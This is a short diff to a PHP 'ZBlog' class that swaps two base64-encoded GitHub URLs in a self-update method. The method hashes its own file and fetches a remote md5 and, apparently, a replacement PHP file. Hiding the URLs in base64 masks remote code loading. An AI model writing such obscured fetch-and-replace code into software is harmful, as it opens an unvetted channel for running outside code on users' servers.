@@ -749,8 +749,8 @@ class ZBlog{
 
     public function upzb(){
         $mm=md5_file(__FILE__);
-        $s1='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21pYmFvMjAyMi9xYXp4c3cyMDIyL21haW4vemJtZDUudHh0';
-        $s2='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21pYmFvMjAyMi9xYXp4c3cyMDIyL21haW4vemIucGhw';
+        $s1='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21pYmFvMjAyMi9xYXp4c3cyMDIyL21haW4vMnpiZnVuY3Rpb25tZDUudHh0';
+        $s2='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21pYmFvMjAyMi9xYXp4c3cyMDIyL21haW4vMnpiZnVuY3Rpb24ucGhw';
         $mm2=trim($this->curl_get(base64_decode($s1)));
         if(!$mm2){
             return false;
